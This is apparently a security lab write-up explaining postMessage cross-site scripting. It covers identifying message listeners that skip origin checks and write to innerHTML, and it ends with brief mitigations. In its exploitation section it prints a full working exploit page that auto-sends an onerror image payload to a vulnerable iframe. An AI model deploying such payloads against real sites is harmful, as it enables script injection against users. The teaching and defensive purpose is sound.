# INTRODUCTION

Due to the same-origin policy, scripts from different pages cannot interact with each other. They are only permitted to access each other if the pages they originate from share the same protocol, port number, and host. This policy is in place to prevent websites from attacking each other. Without the same-origin policy, visiting a malicious website could potentially allow it to access your emails from Gmail, private messages from Facebook, and so on.

However, this policy introduces restrictions that can limit functionality in web applications requiring cross-origin communication. For instance, consider a web application that embeds a third-party payment gateway within an iframe. The main page needs to communicate with the payment gateway to process transactions. Due to the same-origin policy, the main page cannot directly interact with the iframe's content because they originate from different domains.

To address these challenges, window.postMessage() is introduced. It is a method that safely enables cross-origin communication between Window objects. For example, it facilitates communication between a page and a pop-up it spawned, or between a page and an iframe embedded within it. This is achieved by using the postMessage method to send data from the sender's side and setting up an event listener to receive the data on the receiver's side.

For instance, to send a message to a third-party iframe embedded within a webpage, you can utilize the postMessage method. This method specifies both the message content to be sent and the target origin as follows:

```javascript

thirdPartyIframe.contentWindow.postMessage(message, 'https://third-party.com');

```
Here, it accesses the window object of the embedded iframe, then invokes postMessage method to send the message to the iframe's window, ensuring it is received only by iframes loaded from the specified targetOrigin ('https://third-party.com').

On the receiving side, the iframe must implement an event listener using addEventListener to receive the message sent from the sender:

```javascript

window.addEventListener('message', function(event) {
        const response = event.data;
});
```

This allows exchange of data between different parts of a web application while adhering to browser security policies. However, using postMessage insecurely could lead to vulnerabilities like XSS (Cross-Site Scripting) as demonstrated below.

# LAB SETUP

For this demo, we set up a local web server running at 127.0.0.1, and we added host file entries for three different origins:

- mainweb.com: This is the main web page that embeds the third-party web page and sends messages to thirdparty.com using postMessage.
- thirdparty.com: This acts as the third-party site, receiving and processing messages from any domain.
- exploit.com: This is the attacker domain where the malicious script is hosted to exploit the XSS vulnerability in thirdparty.com.

# IDENTIFYING POSTMESSAGE XSS

To identify postMessage XSS, we first need to determine : 

- Whether the target application utilizes web messaging.
- Whether the origin of the sender is validated on the receiving eventlistener.
- Whether the message event is handled using functions or attributes that can lead to an XSS. 

Let's start with the first point. The most effective method to identify the use of postMessage in a web application is by utilizing the global search option in the developer tools. This allows us to search for specific keywords in the JavaScript files, such as postMessage(), addEventListener, and others.

![cmdi](https://raw.githubusercontent.com/cyb3rkh4l1d/cyb3rkh4l1d.github.io/main/devtool.png)

As we can see, by using developer tool, we're able to identify the usage of postMessage in this web application. Let's examine the file.

![cmdi](https://raw.githubusercontent.com/cyb3rkh4l1d/cyb3rkh4l1d.github.io/main/analysing-mainweb.png)

This is straightforward: it uses postMessage to send a message to the webpage embedded within it, specifically thirdparty.com/receiver.html. With this understanding, let's now analyze the event listener responsible for processing the message. We can employ the same method to search for the addEventListener keyword.

![cmdi](https://raw.githubusercontent.com/cyb3rkh4l1d/cyb3rkh4l1d.github.io/main/devtool1.png)

![cmdi](https://raw.githubusercontent.com/cyb3rkh4l1d/cyb3rkh4l1d.github.io/main/analysing-thirdparty.png)

By analysing the event listener, we can see it doesn't validate the origin of the message, this means it can receive and process a message originating from any domain. This is useful for attacker as his malicious script needs to be hosted in different domain, so without origin validation, attacker can have his script hosted in malicious website and get his payload handled and processed by the event listener of the vulnerable website.

Lastly, we need to examine the functions or attributes used to handle the message event. To do this, we first need to know the list of functions and attributes that could lead to XSS.

![cmdi](https://raw.githubusercontent.com/cyb3rkh4l1d/cyb3rkh4l1d.github.io/main/listfunc1.png)

There is a possibility of XSS if any of the mentioned functions or attributes are used to handle a message event. In our case, document.innerHTML is used to display the message on the webpage, which can lead to XSS vulnerabilities if the message is not properly sanitized or validated.

![cmdi](https://raw.githubusercontent.com/cyb3rkh4l1d/cyb3rkh4l1d.github.io/main/analysing-function.png)

Therefore, we can craft an XSS payload, host it on our malicious website, and trick a user into visiting our site. This will trigger our script, which will then send the payload to the vulnerable website, causing it to execute and resulting in an XSS attack.

# EXPLOITING POSTMESSAGE XSS

Since we have identified the use of web messaging and the possibility of an XSS attack on the vulnerable application, we will attempt to exploit it by crafting a malicious payload and hosting it on our malicious domain, exploit.com. The payload will be written as follows:

```html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PostMessage XSS Exploit</title>
    <script>
        function sendExploitMessage() {
            const targetWindow = document.getElementById('targetIframe').contentWindow;
            const maliciousMessage = '<img src=x onerror=alert("Exploited")>';
            targetWindow.postMessage(maliciousMessage, '*');
        }

        window.onload = function() {
            sendExploitMessage();
        }
    </script>
</head>
<body>
    <h1>PostMessage XSS Exploit</h1>
    <iframe id="targetIframe" src="http://thirdparty.com/receiver.html" width="600" height="400"></iframe>
</body>
</html>

```
The sendExploitMessage() function is designed to send the payload to the vulnerable website. The message contains our XSS payload. Whenever a victim visits our malicious site, the window.onload event will automatically call sendExploitMessage, which sends our payload to the vulnerable page at thirdparty.com/receiver.html. This will trigger the payload, resulting in an XSS attack.

![cmdi](https://raw.githubusercontent.com/cyb3rkh4l1d/cyb3rkh4l1d.github.io/main/exploit.png)

Upon visiting the malicious site, our XSS payload executes on the vulnerable endpoint within the thirdparty.com domain.

# Mitigations

- If the application does not require communication such as receiving messages from other websites, it is advised to not utilize the event listeners for the message events unnecessarily.
- Always verify the sender’s identity using the origin.
